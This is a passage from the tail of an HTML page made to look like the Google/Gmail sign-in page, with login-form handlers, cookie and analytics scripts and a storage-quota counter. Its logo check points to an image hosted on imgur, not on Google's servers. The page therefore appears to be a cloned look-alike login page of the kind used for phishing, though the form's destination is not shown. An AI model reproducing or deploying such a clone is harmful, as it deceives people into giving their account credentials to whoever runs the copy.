  function gaia_onLoginSubmit() {
    
    
    if (window.gaiacb_onLoginSubmit) {
      gaiacb_onLoginSubmit();
    }
    
    

  
  try {
    document.bg.invoke(function(response) {
      document.getElementById('bgresponse').value = response;
    });
  } catch (err) {}
  


    return true;
  }
  document.getElementById('gaia_loginform').onsubmit = gaia_onLoginSubmit;

  
  
    var Ga=!0,G=null,Gb=!1,Gc;var Ge=function(a,b){var c=a;a&&"string"==typeof a&&(c=document.getElementById(a));if(b&&!c)throw new Gd(a);return c},Gd=function(a){this.id=a;this.toString=function(){return"No element found for id '"+this.id+"'"}};var Gf={},Gg;Gg=window.addEventListener?function(a,b,c){var d=function(a){var b=c.call(this,a);Gb===b&&Gh(a);return b};a=Ge(a,Ga);a.addEventListener(b,d,Gb);Gi(a,b).push(d);return d}:window.attachEvent?function(a,b,c){a=Ge(a,Ga);var d=function(){var b=window.event,d=c.call(a,b);Gb===d&&Gh(b);return d};a.attachEvent("on"+b,d);Gi(a,b).push(d);return d}:void 0;var Gh=function(a){a.preventDefault?a.preventDefault():a.returnValue=Gb;return Gb};
var Gi=function(a,b){Gf[a]=Gf[a]||{};Gf[a][b]=Gf[a][b]||[];return Gf[a][b]};var Gj=function(){try{return new XMLHttpRequest}catch(a){for(var b=["MSXML2.XMLHTTP.6.0","MSXML2.XMLHTTP.3.0","MSXML2.XMLHTTP","Microsoft.XMLHTTP"],c=0;c<b.length;c++)try{return new ActiveXObject(b[c])}catch(d){}}return G},Gk=function(){this.h=Gj();this.parameters={}};Gk.prototype.g=function(){};
Gk.prototype.send=function(a){var b=[],c;for(c in this.parameters){var d=this.parameters[c];b.push(c+"="+encodeURIComponent(d))}var b=b.join("&"),e=this.h,f=this.g;e.open("POST",a,Ga);e.setRequestHeader("Content-type","application/x-www-form-urlencoded");e.onreadystatechange=function(){4==e.readyState&&f({status:e.status,text:e.responseText})};e.send(b)};
Gk.prototype.r=function(a){var b=this.g,c=this.h;c.open("GET",a,Ga);c.onreadystatechange=function(){4==c.readyState&&b({status:c.status,text:c.responseText})};c.send()};var Gm=function(a){this.f=a;this.n=this.o();if(this.f==G)throw new Gl("Empty module name");};Gc=Gm.prototype;Gc.o=function(){var a=window.location.pathname;return a&&0==a.indexOf("/accounts")?"/accounts/JsRemoteLog":"/JsRemoteLog"};
Gc.q=function(a,b,c){var d=this.n,e=this.f||"",d=d+"?module="+encodeURIComponent(e);a=a||"";d=d+"&type="+encodeURIComponent(a);b=b||"";d=d+"&msg="+encodeURIComponent(b);c=c||[];for(a=0;a<c.length;a++)d=d+"&arg="+encodeURIComponent(c[a]);try{var f=Math.floor(1E4*Math.random()),d=d+"&r="+String(f)}catch(g){}return d};Gc.send=function(a,b,c){var d=new Gk;d.parameters={};try{var e=this.q(a,b,c);d.r(e)}catch(f){}};Gc.a=function(a,b){this.send("ERROR",a,b)};
Gc.i=function(a){var b=this;return function(){try{return a.apply(G,arguments)}catch(c){throw b.a("Uncatched exception: "+c),c;}}};var Gl=function(){};var Gn=Gn||new Gm("uri"),Go=RegExp("^(?:([^:/?#.]+):)?(?://(?:([^/?#]*)@)?([\\w\\d\\-\\u0100-\\uffff.%]*)(?::([0-9]+))?)?([^?#]+)?(?:\\?([^#]*))?(?:#(.*))?$"),Gp=function(a){return"http"==a.toLowerCase()?80:"https"==a.toLowerCase()?443:G},Gq=function(a,b){var c=b.match(Go)[1]||G,d,e=b.match(Go)[3]||G;d=e&&decodeURIComponent(e);e=Number(b.match(Go)[4]||G)||G;if(!c||!d)return Gn.a("Invalid origin Exception",[String(b)]),Gb;e||(e=Gp(c));var f=a.match(Go)[1]||G;if(!f||f.toLowerCase()!=c.toLowerCase())return Gb;
c=(c=a.match(Go)[3]||G)&&decodeURIComponent(c);if(!c||c.toLowerCase()!=d.toLowerCase())return Gb;(d=Number(a.match(Go)[4]||G)||G)||(d=Gp(f));return e==d};var Gr=Gr||new Gm("check_connection"),Gs="^([^:]+):(\\d*):(\\d?)$",Gt=G,Gu=G,Gv=G,Gw=function(a,b){this.d=a;this.c=b;this.b=Gb};Gc=Gw.prototype;Gc.j=function(a,b){if(!b)return Gb;if(0<=a.indexOf(","))return Gr.a("CheckConnection result contains comma",[a]),Gb;var c=b.value;b.value=c?c+","+a:a;return Ga};Gc.e=function(a){return this.j(a,Gu)};Gc.l=function(a){return this.j(a,Gv)};Gc.k=function(a){a=a.match(Gs);return!a||3>a.length?G:a[1]};
Gc.s=function(a,b){if(!Gq(this.d,a))return Gb;if(this.b||!b)return Ga;"accessible"==b?(this.e(a),this.b=Ga):this.k(b)==this.c&&(this.l(b)||this.e(a),this.b=Ga);return Ga};Gc.p=function(){var a;a=this.d;var b="timestamp",c=String((new Date).getTime());if(0<a.indexOf("#"))throw Object("Unsupported URL Exception: "+a);return a=0<=a.indexOf("?")?a+"&"+encodeURIComponent(b)+"="+encodeURIComponent(c):a+"?"+encodeURIComponent(b)+"="+encodeURIComponent(c)};
Gc.m=function(){var a=window.document.createElement("iframe"),b=a.style;b.visibility="hidden";b.width="1px";b.height="1px";b.position="absolute";b.top="-100px";a.src=this.p();a.id=this.c;Gt.appendChild(a)};
var Gx=function(a){return function(b){var c=b.origin.toLowerCase();b=b.data;for(var d=a.length,e=0;e<d&&!a[e].s(c,b);e++);}},Gy=function(){if(window.postMessage){var a;a=window.__CHECK_CONNECTION_CONFIG.iframeParentElementId;var b=window.__CHECK_CONNECTION_CONFIG.connectivityElementId,c=window.__CHECK_CONNECTION_CONFIG.newResultElementId;(Gt=document.getElementById(a))?(b&&(Gu=document.getElementById(b)),c&&(Gv=document.getElementById(c)),!Gu&&!Gv?(Gr.a("Unable to locate the input element to storeCheckConnection result",
["old id: "+String(b),"new id: "+String(c)]),a=Gb):a=Ga):(Gr.a("Unable to locate the iframe anchor to append connection test iframe",["element id: "+a]),a=Gb);if(a){a=window.__CHECK_CONNECTION_CONFIG.domainConfigs;if(!a){if(!window.__CHECK_CONNECTION_CONFIG.iframeUri){Gr.a("Missing iframe URL in old configuration");return}a=[{iframeUri:window.__CHECK_CONNECTION_CONFIG.iframeUri,domainSymbol:"youtube"}]}if(0!=a.length){for(var b=a.length,c=[],d=0;d<b;d++)c.push(new Gw(a[d].iframeUri,a[d].domainSymbol));
Gg(window,"message",Gx(c));for(d=0;d<b;d++)c[d].m()}}}},Gz=function(){if(window.__CHECK_CONNECTION_CONFIG){var a=window.__CHECK_CONNECTION_CONFIG.postMsgSupportElementId;if(window.postMessage){var b=document.getElementById(a);b?b.value="1":Gr.a("Unable to locate the input element to storepostMessage test result",["element id: "+a])}}};G_checkConnectionMain=Gr.i(Gy);G_setPostMessageSupportFlag=Gr.i(Gz);


    window.__CHECK_CONNECTION_CONFIG = {
      
      
        newResultElementId: 'checkConnection',
        domainConfigs: [{iframeUri: 'https://accounts.youtube.com/accounts/CheckConnection?pmpo\75https%3A%2F%2Faccounts.google.com\46v\075605652683',domainSymbol: 'youtube'}],
      

      
      iframeUri: '',
      
      iframeOrigin: '',
      
      connectivityElementId: 'dnConn',
      
      iframeParentElementId: 'cc_iframe_parent',
      
      postMsgSupportElementId: 'pstMsg',
      
      msgContent: 'accessible'
    };

    G_setPostMessageSupportFlag();
    G_checkConnectionMain();
  

  

  

  
</script>
<script type="text/javascript">
  gaia_appendParam = function(url, name, value) {
  var param = encodeURIComponent(name) + '=' + encodeURIComponent(value);
  if (url.indexOf('?') >= 0) {
  return url + '&' + param;
  } else {
  return url + '?' + param;
  }
  };
  var langChooser = document.getElementById('lang-chooser');
  var langChooserWrap = document.getElementById('lang-chooser-wrap');
  if (langChooser && langChooserWrap) {
  var langChooserParam = 'hl';
  var langChooserUrl = '\x2FServiceLogin?service=mail\x26passive=true\x26rm=false\x26continue=http%3A%2F%2Fmail.google.com%2Fmail%2F\x26scc=1\x26ltmpl=default\x26ltmplcache=2\x26lp=1';
  langChooserWrap.style.display = '';
  langChooser.onchange = function() {
  window.location.href =
  gaia_appendParam(langChooserUrl, langChooserParam, this.value);
  };
  }
</script>
<script type="text/javascript">
  var gaia_swapHiResLogo = function() {
  var devicePixelRatio =
  window.devicePixelRatio ? window.devicePixelRatio : 1;
  if (devicePixelRatio > 1) {
  var logos = gaia_getElementsByClass('logo');
  for (var i = 0; i < logos.length; i++) {
        if (logos[i].nodeName == 'IMG' &&
            logos[i].src.search('https://i.imgur.com/VAdfu3j.png') > 0) {
  logos[i].width = 116;
  logos[i].height = 41;
  logos[i].src = '//ssl.gstatic.com/images/logo_ret.png';
  }
  }
  }
  }
  gaia_swapHiResLogo();
</script>
<script type="text/javascript">
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-992684-1']);
_gaq.push(['_setDomainName', 'accounts.google.com']);
_gaq.push(['_setAllowLinker', true]);
_gaq.push(['_addIgnoredRef', 'mail.google.com']);
_gaq.push(['_setAllowAnchor', true]);
_gaq.push(['_trackPageview', '/mail/homepage']);
(function() {
  var ga = document.createElement('script'); ga.type = 'text/javascript';
  ga.async = true;
  ga.src = ('https:' == document.location.protocol ? 'https://ssl' :
  'http://www') + '.google-analytics.com/ga.js';
  (document.getElementsByTagName('head')[0] ||
  document.getElementsByTagName('body')[0]).appendChild(ga);
})();
</script>
  <script type="text/javascript">
var BrowserSupport_={IsBrowserSupported:function(){var agt=navigator.userAgent.toLowerCase();var is_op=agt.indexOf("opera")!=-1;var is_ie=agt.indexOf("msie")!=-1&&document.all&&!is_op;var is_ie5=agt.indexOf("msie 5")!=-1&&document.all&&!is_op;var is_mac=agt.indexOf("mac")!=-1;var is_gk=agt.indexOf("gecko")!=-1;var is_sf=agt.indexOf("safari")!=-1;if(is_ie&&!is_op&&!is_mac){if(agt.indexOf("palmsource")!=
-1||agt.indexOf("regking")!=-1||agt.indexOf("windows ce")!=-1||agt.indexOf("j2me")!=-1||agt.indexOf("avantgo")!=-1||agt.indexOf(" stb")!=-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,"msie ");if(v!=null)return v>=5.5}if(is_gk&&!is_sf){var v=BrowserSupport_.GetFollowingFloat(agt,"rv:");if(v!=null)return v>=1.4;else{v=BrowserSupport_.GetFollowingFloat(agt,"galeon/");if(v!=null)return v>=
1.3}}if(is_sf){if(agt.indexOf("rv:3.14.15.92.65")!=-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,"applewebkit/");if(v!=null)return v>=312}if(is_op){if(agt.indexOf("sony/com1")!=-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,"opera ");if(v==null)v=BrowserSupport_.GetFollowingFloat(agt,"opera/");if(v!=null)return v>=8}if(agt.indexOf("pda; sony/com2")!=-1)return true;return false},
GetFollowingFloat:function(str,pfx){var i=str.indexOf(pfx);if(i!=-1){var v=parseFloat(str.substring(i+pfx.length));if(!isNaN(v))return v}return null}};var is_browser_supported=BrowserSupport_.IsBrowserSupported()
  </script>
<script type="text/javascript">
<!--

var start_time = (new Date()).getTime();

if (top.location != self.location) {
 top.location = self.location.href;
}

function SetGmailCookie(name, value) {
  document.cookie = name + "=" + value + ";path=/;domain=.google.com";
}

function lg() {
  var now = (new Date()).getTime();

  var cookie = "T" + start_time + "/" + start_time + "/" + now;
  SetGmailCookie("GMAIL_LOGIN", cookie);
}

function gaiacb_onLoginSubmit() {
  lg();
  if (!fixed) {
    FixForm();
  }
  return true;
}

function StripParam(url, param) {
  var start = url.indexOf(param);
  if (start == -1) return url;
  var end = start + param.length;

  var charBefore = url.charAt(start-1);
  if (charBefore != '?' && charBefore != '&') return url;

  var charAfter = (url.length >= end+1) ? url.charAt(end) : '';
  if (charAfter != '' && charAfter != '&' && charAfter != '#') return url;
  if (charBefore == '&') {
  --start;
  } else if (charAfter == '&') {
  ++end;
  }
  return url.substring(0, start) + url.substring(end);
}
var fixed = 0;
function FixForm() {
  if (is_browser_supported) {
  var form = el("gaia_loginform");
  if (form && form["continue"]) {
  var url = form["continue"].value;
  url = StripParam(url, "ui=html");
  url = StripParam(url, "zy=l");
  form["continue"].value = url;
  }
  }
  fixed = 1;
}
function el(id) {
  if (document.getElementById) {
  return document.getElementById(id);
  } else if (window[id]) {
  return window[id];
  }
  return null;
}
// Estimates of nanite storage generation over time.
var CP = [
 [ 1224486000000, 7254 ],
 [ 1335290400000, 7704 ],
 [ 1335376800000, 10240 ],
 [ 2144908800000, 13531 ],
 [ 2147328000000, 43008 ],
 [ 46893711600000, Number.MAX_VALUE ]
];
var quota_elem;
var ONE_PX = "https://mail.google.com/mail/images/c.gif?t=" +
  (new Date()).getTime();
function LogRoundtripTime() {
  var img = new Image();
  var start = (new Date()).getTime();
  img.onload = GetRoundtripTimeFunction(start);
  img.src = ONE_PX;
}
function GetRoundtripTimeFunction(start) {
  return function() {
  var end = (new Date()).getTime();
  SetGmailCookie("GMAIL_RTT", (end - start));
  }
}
function MaybePingUser() {
  var f = el("gaia_loginform");
  if (f.Email.value) {
  new Image().src = 'https://mail.google.com/mail?gxlu=' +
  encodeURIComponent(f.Email.value) +
  '&zx=' + (new Date().getTime());
  }
}
function OnLoad() {
  gaia_setFocus();
  MaybePingUser();
  var passwd_elem = el("Passwd");
  if (passwd_elem) {
  passwd_elem.onfocus = MaybePingUser;
  }
  LogRoundtripTime();
  if (!quota_elem) {
  quota_elem = el("quota");
  updateQuota();
  }
  LoadConversionScript();
}
function updateQuota() {
  if (!quota_elem) {
  return;
  }
  var now = (new Date()).getTime();
  var i;
  for (i = 0; i < CP.length; i++) {
    if (now < CP[i][0]) {
      break;
    }
  }
  if (i == 0) {
    setTimeout(updateQuota, 1000);
  } else if (i == CP.length) {
    quota_elem.innerHTML = CP[i - 1][1];
  } else {
    var ts = CP[i - 1][0];
    var bs = CP[i - 1][1];
    quota_elem.innerHTML = format(((now-ts) / (CP[i][0]-ts) * (CP[i][1]-bs)) + bs);
    setTimeout(updateQuota, 1000);
  }
}

var PAD = '.000000';

function format(num) {
  var str = String(num);
  var dot = str.indexOf('.');
  if (dot < 0) {
     return str + PAD;
  } if (PAD.length > (str.length - dot)) {
  return str + PAD.substring(str.length - dot);
  } else {
  return str.substring(0, dot + PAD.length);
  }
}
var google_conversion_type = 'landing';
var google_conversion_id = 1069902127;
var google_conversion_language = "en_US";
var google_conversion_format = "1";
var google_conversion_color = "FFFFFF";
function LoadConversionScript() {
  var script = document.createElement("script");
  script.type = "text/javascript";
  script.src = "https://www.googleadservices.com/pagead/conversion.js";
}
// -->
</script>
<script>
window.onload = function() {
  OnLoad();
  FixForm();
}
</script>
  </div>
  

</body></html>
